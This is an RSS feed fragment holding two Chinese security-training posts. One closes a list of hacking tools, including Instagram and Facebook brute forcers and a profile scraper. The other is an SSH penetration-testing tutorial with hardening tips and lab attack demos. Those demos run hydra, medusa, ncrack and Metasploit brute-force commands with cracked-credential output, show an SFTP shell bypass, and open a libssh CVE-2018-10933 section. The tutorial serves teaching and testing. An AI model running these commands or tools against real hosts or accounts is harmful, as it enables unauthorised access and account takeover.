data-original=&quot;https://pic2.zhimg.com/v2-4033e0d126cede5649b497fe1c9d52ad_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4033e0d126cede5649b497fe1c9d52ad_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;360&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic2.zhimg.com/v2-4033e0d126cede5649b497fe1c9d52ad_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-4033e0d126cede5649b497fe1c9d52ad_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;016 SocialBox&lt;/h2&gt;&lt;blockquote&gt;由 Belahsan Ouerghi 编码的 Bruteforce 攻击框架（Facebook，Gmail，Instagram，Twitter）&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/Cyb0r9/SocialBox&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/Cyb0r9/Socia&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;lBox&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7f02e816681b70850ee4465d5e175c91_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;567&quot; data-rawheight=&quot;629&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;567&quot; data-original=&quot;https://pic2.zhimg.com/v2-7f02e816681b70850ee4465d5e175c91_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7f02e816681b70850ee4465d5e175c91_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;567&quot; data-rawheight=&quot;629&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;567&quot; data-original=&quot;https://pic2.zhimg.com/v2-7f02e816681b70850ee4465d5e175c91_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-7f02e816681b70850ee4465d5e175c91_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;017 Instainsane&lt;/h2&gt;&lt;blockquote&gt;Instainsane 是一个 Shell 脚本，可以对 Instagram 进行多线程蛮力攻击，该脚本可以绕过登录限制，并且可以一次以100次尝试以大约1000个密码/分钟的速度测试无限数量的密码。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/thelinuxchoice/instainsane&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/thelinuxchoi&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ce/instainsane&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;优势&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;多线程（一次尝试100次）&lt;/li&gt;&lt;li&gt;保存/恢复会话&lt;/li&gt;&lt;li&gt;通过 TOR 匿名&lt;/li&gt;&lt;li&gt;检查有效的用户名&lt;/li&gt;&lt;li&gt;丰富密码字典&lt;/li&gt;&lt;li&gt;检查并安装所有依赖项&lt;/li&gt;&lt;/ul&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ae44b0c44e3f8a47693e5b259517d58c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;616&quot; data-rawheight=&quot;491&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;616&quot; data-original=&quot;https://pic1.zhimg.com/v2-ae44b0c44e3f8a47693e5b259517d58c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ae44b0c44e3f8a47693e5b259517d58c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;616&quot; data-rawheight=&quot;491&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;616&quot; data-original=&quot;https://pic1.zhimg.com/v2-ae44b0c44e3f8a47693e5b259517d58c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-ae44b0c44e3f8a47693e5b259517d58c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;018 Tool-X&lt;/h2&gt;&lt;blockquote&gt;Tool-X 是 kali linux 黑客工具安装程序。为 termux 和其他 Android 终端开发的 Tool-X。使用 Tool-X，您可以在 termux 应用程序和其他基于 Linux 的发行版中安装近 370 多种黑客工具。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/Rajkumrdusad/Tool-X&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/Rajkumrdusad&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/Tool-X&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-132fc22e621b14618ff37405f2cc4c0e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;625&quot; data-rawheight=&quot;640&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;625&quot; data-original=&quot;https://pic3.zhimg.com/v2-132fc22e621b14618ff37405f2cc4c0e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-132fc22e621b14618ff37405f2cc4c0e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;625&quot; data-rawheight=&quot;640&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;625&quot; data-original=&quot;https://pic3.zhimg.com/v2-132fc22e621b14618ff37405f2cc4c0e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-132fc22e621b14618ff37405f2cc4c0e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;019 Hacktronian&lt;/h2&gt;&lt;blockquote&gt;适用于 Linux 和 Android 的多合一黑客工具。&lt;/blockquote&gt;&lt;p&gt;官网：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//thehackingsage.github.io/hacktronian/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;thehackingsage.github.io&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/hacktronian/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/thehackingsage/hacktronian&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/thehackingsa&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ge/hacktronian&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;功能&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;信息收集&lt;/li&gt;&lt;li&gt;密码爆破&lt;/li&gt;&lt;li&gt;无线测试&lt;/li&gt;&lt;li&gt;开发工具&lt;/li&gt;&lt;li&gt;嗅探与欺骗&lt;/li&gt;&lt;li&gt;网络黑客工具&lt;/li&gt;&lt;li&gt;私人网络黑客工具&lt;/li&gt;&lt;li&gt;Post Exploitation&lt;/li&gt;&lt;/ul&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dbf2fd9c268550b54d2beaa40fce67ca_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;262&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-dbf2fd9c268550b54d2beaa40fce67ca_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dbf2fd9c268550b54d2beaa40fce67ca_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;262&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;640&quot; data-original=&quot;https://pic3.zhimg.com/v2-dbf2fd9c268550b54d2beaa40fce67ca_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-dbf2fd9c268550b54d2beaa40fce67ca_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;020 Ultimate Facebook Scraper&lt;/h2&gt;&lt;blockquote&gt;该机器人可抓取 Facebook 用户个人资料的几乎所有内容，包括用户时间轴上可用的所有公共帖子/状态，上传的照片，带标签的照片，视频，朋友列表及其个人资料照片（包括关注者，关注者，工作朋友，大学朋友等） 。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/harismuneer/Ultimate-Facebook-Scraper&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/harismuneer/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;Ultimate-Facebook-Scraper&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;特征&lt;/b&gt;&lt;/p&gt;&lt;p&gt;抓取 Facebook 用户个人资料几乎所有内容：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;上传的照片&lt;/li&gt;&lt;li&gt;标记的照片&lt;/li&gt;&lt;li&gt;影片&lt;/li&gt;&lt;li&gt;朋友列表及其个人资料照片（包括关注者，被关注者等）&lt;/li&gt;&lt;li&gt;以及用户时间轴上所有可用的公开帖子/状态。&lt;/li&gt;&lt;/ul&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-18838ecce3d7049ead1c0ef10cf60230_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;623&quot; data-rawheight=&quot;640&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;623&quot; data-original=&quot;https://pic1.zhimg.com/v2-18838ecce3d7049ead1c0ef10cf60230_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-18838ecce3d7049ead1c0ef10cf60230_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;623&quot; data-rawheight=&quot;640&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;623&quot; data-original=&quot;https://pic1.zhimg.com/v2-18838ecce3d7049ead1c0ef10cf60230_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-18838ecce3d7049ead1c0ef10cf60230_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;以上就是 2019 年最受欢迎的 20 款黑客工具，走过路过千万不用错过~&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;源自：KitPloit&lt;/blockquote&gt;&lt;p&gt;更多有关内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-07-100870206</guid>
<pubDate>Tue, 07 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>渗透测试中的SSH</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-06-101260538.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101260538&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6c752bdf4bd8271296bcba570ce8e9be_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;什么是SSH和SFTP？&lt;/h2&gt;&lt;p&gt;&lt;b&gt;SSH&lt;/b&gt;&lt;/p&gt;&lt;p&gt;是一种安全的远程外壳协议，用于通过不安全的网络安全地运行网络服务。默认的 SSH 端口是 22，通常会在 Internet 或 Intranet 的服务器上开启。&lt;/p&gt;&lt;p&gt;&lt;b&gt;SFTP&lt;/b&gt;&lt;/p&gt;&lt;p&gt;是 SSH 文件传输协议，该协议用于通过 SSH 连接传输文件，大多数 SSH 实现也支持 SFTP。&lt;/p&gt;&lt;h2&gt;SSH服务器/库&lt;/h2&gt;&lt;p&gt;最常见的 SSH 服务器和客户端是 openSSH（OpenBSD 安全外壳）。是 SSH 的一个功能强大的开源实现。OpenSSH 提供了服务端后台程序和客户端工具，用来加密远程控制和文件传输过程中的数据，并由此来代替原来的类似服务。&lt;/p&gt;&lt;p&gt;但是 openSSH 并不是唯一的实现，还有其他的：&lt;/p&gt;&lt;p&gt;&lt;b&gt;SSH 服务器&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;openSSH – OpenBSD SSH，自 Windows 10 起在 BSD，Linux 发行版和 Windows中提供&lt;/li&gt;&lt;li&gt;Dropbear – OpenWrt 附带的用于内存和处理器资源较少的环境的SSH实现&lt;/li&gt;&lt;li&gt;PuTTY – Windows 的 SSH 实现，通常使用客户端，但很少使用服务器&lt;/li&gt;&lt;li&gt;CopSSH – Windows 版 OpenSSH&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;SSH库（在服务器端实现）&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;libssh -多平台 C 库实现与在绑定 SSHv2 的协议 Python、Perl; 它由 KDE 用于 sftp，由 GitHub 用于 git SSH 基础结构&lt;/li&gt;&lt;li&gt;wolfSSH –用 ANSI C 编写的 SSHv2 服务器库，面向嵌入式、RTOS 和资源受限的环境&lt;/li&gt;&lt;li&gt;Apache MINA SSHD – Apache SSHD Java 库基于 Apache MINA&lt;/li&gt;&lt;li&gt;paramiko – Python SSHv2 协议库&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;常见的配置错误&lt;/h2&gt;&lt;p&gt;&lt;b&gt;001-root登录&lt;/b&gt;&lt;/p&gt;&lt;p&gt;默认情况下，大多数 SSH 服务器实现将允许 root 登录，建议禁用，因为如果该帐户的密码泄漏，攻击者将直接获得管理员权限。&lt;/p&gt;&lt;p&gt;&lt;b&gt;如何禁用openSSH的root登录：&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;编辑 SSH 服务器配置 sudoedit /etc/ssh/sshd_config&lt;/li&gt;&lt;li&gt;更改 #PermitRootLogin yes 成 PermitRootLogin no&lt;/li&gt;&lt;li&gt;考虑配置更改：sudo systemctl daemon-reload&lt;/li&gt;&lt;li&gt;重启 SSH 服务器 sudo systemctl restart sshd &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;002-SFTP 命令执行&lt;/b&gt;&lt;/p&gt;&lt;p&gt;另一个常见的 SSH 错误配置通常出现在 SFTP 配置中。很多人在创建 SFTP 服务器时，管理员希望用户具有 SFTP 访问权限来共享文件，而不希望在计算机上获得远程 Shell。因此，在创建用户时为用户分配 placeholder shell（如 /usr/bin/nologin 或 /usr/bin/false）并避免 shell 访问或滥用整个文件系统。&lt;/p&gt;&lt;p&gt;这样是错误的，用户可以在身份验证后立即要求执行命令，然后再执行其默认命令或 shell 程序。因此，只需执行以下操作即可执行命令（例如 /bin/bash）：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是用户 noraj 的 SFTP 配置（/ etc / ssh / sshd_config – openSSH）：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Match User noraj
        ChrootDirectory %h
        ForceCommand internal-sftp
        AllowTcpForwarding no
        PermitTunnel no
        X11Forwarding no
        PermitTTY no&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此配置将仅允许 SFTP 通过强制启动命令并禁用 TTY 访问来禁用 shell 程序访问，还可以禁用所有类型的端口转发或隧道。&lt;/p&gt;&lt;p&gt;&lt;b&gt;003-认证方式&lt;/b&gt;&lt;/p&gt;&lt;p&gt;在安全性较高的环境中，通常是仅启用基于密钥或两因素的身份验证，而不是基于简单因素密码的身份验证。但是通常启用更强的身份验证方法而不会禁用较弱的身份验证方法。一种常见的情况是启用 publickeyopenSSH 配置并将其设置为默认方法，而不是禁用 password。因此，通过使用 SSH 客户端的 verbose 模式，攻击者可以看到启用了一种较弱的方法：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;例如，如果设置了身份验证失败限制，而也没有机会使用密码，则可以使用 PreferredAuthentications 选项强制调用此方法。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看 SSH 服务器配置，检查是否仅授权了所讲的方法。&lt;/p&gt;&lt;h2&gt;攻击演示&lt;/h2&gt;&lt;p&gt;一系列攻击示例，可以在某些 SSH 服务器中进行测试。&lt;/p&gt;&lt;p&gt;&lt;b&gt;密码猜测/爆破&lt;/b&gt;&lt;/p&gt;&lt;p&gt;目标：192.168.1.94 端口：22&lt;/p&gt;&lt;p&gt;&lt;b&gt;Metasploit&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ msf5 &amp;gt; search ssh

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
...
   17  auxiliary/scanner/ssh/ssh_login                                              normal     Yes    SSH Login Check Scanner
...
msf5 &amp;gt; use 17
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set PASS_FILE /usr/share/wordlists/password/rockyou.txt
PASS_FILE =&amp;gt; /usr/share/wordlists/password/rockyou.txt
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set RHOSTS 192.168.1.94
RHOSTS =&amp;gt; 192.168.1.94
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set THREADS 10
THREADS =&amp;gt; 10
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set STOP_ON_SUCCESS true
STOP_ON_SUCCESS =&amp;gt; true
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set username noraj
username =&amp;gt; noraj
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; run

[+] 192.168.1.94:22 - Success: &amp;#39;noraj:noraj&amp;#39; &amp;#39;&amp;#39;
[*] Command shell session 1 opened (192.168.1.83:37291 -&amp;gt; 192.168.1.94:22) at 2020-01-02 21:33:33 +0100
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;hydra（九头蛇）&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ hydra -l noraj -P /usr/share/wordlists/password/rockyou.txt -e s ssh://192.168.1.94
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-02 21:44:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.94:22/
[22][ssh] host: 192.168.1.94   login: noraj   password: noraj
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-02 21:44:33&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参数：&lt;/p&gt;&lt;blockquote&gt;-l LOGIN or -L FILE  使用名称登录，或从文件中加载多个登录名 &lt;br/&gt;-p PASS  or -P FILE  使用密码登录，或从文件加载多个密码&lt;br/&gt;-e nsr    尝试使用“ n”个空密码，以“ s”作为通过登录名和“ r”反向登录服务破解服务&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;medusa&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ medusa -h 192.168.1.94 -u noraj -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &amp;lt;jmk@foofus.net&amp;gt;

ACCOUNT CHECK: [ssh] Host: 192.168.1.94 (1 of 1, 0 complete) User: noraj (1 of 1, 0 complete) Password: noraj (1 of 14344391 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.1.94 User: noraj Password: noraj [SUCCESS]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参数：&lt;/p&gt;&lt;blockquote&gt;-h [TEXT]    : 目标主机名或 IP 地址&lt;br/&gt;-u [TEXT]    : 要测试的用户名&lt;br/&gt;-P [FILE]    : 要测试的密码文件&lt;br/&gt;-e [n/s/ns]  : 其他密码检查（[n]无密码，[s]密码=用户名）&lt;br/&gt;-M [TEXT]    : 要执行的模块的名称（不带 .mod 扩展名）&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;Ncrack&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ ncrack --user noraj -P /usr/share/wordlists/password/rockyou.txt ssh://192.168.1.94
Starting Ncrack 0.7 ( http://ncrack.org ) at 2020-01-02 21:50 CET

Discovered credentials for ssh on 192.168.1.94 22/tcp:
192.168.1.94 22/tcp ssh: &amp;#39;noraj&amp;#39; &amp;#39;noraj&amp;#39;

Ncrack done: 1 service scanned in 3.00 seconds.

Ncrack finished.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参数：&lt;/p&gt;&lt;blockquote&gt;-P &amp;lt;filename&amp;gt;: 密码文件&lt;br/&gt;--user &amp;lt;username_list&amp;gt;: 以逗号分隔的用户名列表&lt;/blockquote&gt;&lt;h2&gt;漏洞利用– LibSSH RCE&lt;/h2&gt;&lt;p&gt;&lt;b&gt;CVE-2018-10933&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//cve.mitre.org/cgi-bin/cvename.cgi%3Fname%3DCVE-2018-10933&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;cve.mitre.org/cgi-bin/c&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;vename.cgi?name=CVE-2018-10933&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;影响 libssh 库的漏洞，此漏洞通过绕过身份验证允许未经授权的访问。&lt;/p&gt;&lt;blockquote&gt;libssh 0.6 及更高版本在服务器代码中具有身份验证绕过漏洞。&lt;/blockquote&gt;&lt;p&gt;通过向服务器提供 SSH2_MSG_USERAUTH_SUCCESS 消息代替服务器希望进行身份验证的 SSH2_MSG_USERAUTH_REQUEST 消息，攻击者可以在没有任何凭据的情况下成功进行身份验证。&lt;/p&gt;&lt;p&gt;nmap 扫描结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;22/tcp  open     ssh      libssh 0.8.3 (protocol 2.0)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;searchsploit（用于本地浏览 Exploit-DB 的工具）显示了可用于的现有漏洞利用 libssh。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;searchsploit libssh
-------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                              |  Path
                                                                                            | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------- ----------------------------------------
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access                                                  | exploits/linux/remote/46307.py
